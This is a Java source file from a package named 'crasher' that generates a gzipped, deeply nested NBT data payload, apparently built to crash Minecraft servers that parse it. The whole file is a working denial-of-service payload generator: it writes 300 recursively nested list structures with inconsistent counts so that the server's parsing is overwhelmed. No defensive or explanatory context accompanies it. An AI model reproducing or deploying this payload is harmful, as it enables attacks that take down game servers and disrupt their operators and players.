package net.moofMonkey.crasher;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.util.zip.GZIPOutputStream;

public class TooLongNBT {
	private static byte[] data;

	public static int getDataLength() {
		return TooLongNBT.data.length;
	}

	public static byte[] getData() {
		return TooLongNBT.data;
	}

	static {
		try {
			final ByteArrayOutputStream bytestream = new ByteArrayOutputStream();
			final DataOutputStream nbtdos = new DataOutputStream(new GZIPOutputStream(bytestream));
			nbtdos.writeByte(10);
			nbtdos.writeUTF("");
			for(int i = 0; i < 300; ++i)
				writeLists(nbtdos);
			nbtdos.writeByte(0);
			nbtdos.close();
			TooLongNBT.data = bytestream.toByteArray();
		} catch(Throwable t) {  }
	}
	
	public static void writeLists(final DataOutputStream dos) throws IOException {
		writeLists(dos, 0);
	}

	private static void writeLists(final DataOutputStream dos, final int count) throws IOException {
		if (count <= 4) {
			dos.writeByte(9);
			dos.writeUTF("");
			dos.writeByte(9);
			dos.writeInt(10);
			for(int i = 1; i < 10; ++i) {
				writeLists(dos, count + 1);
			}
		}
	}
}
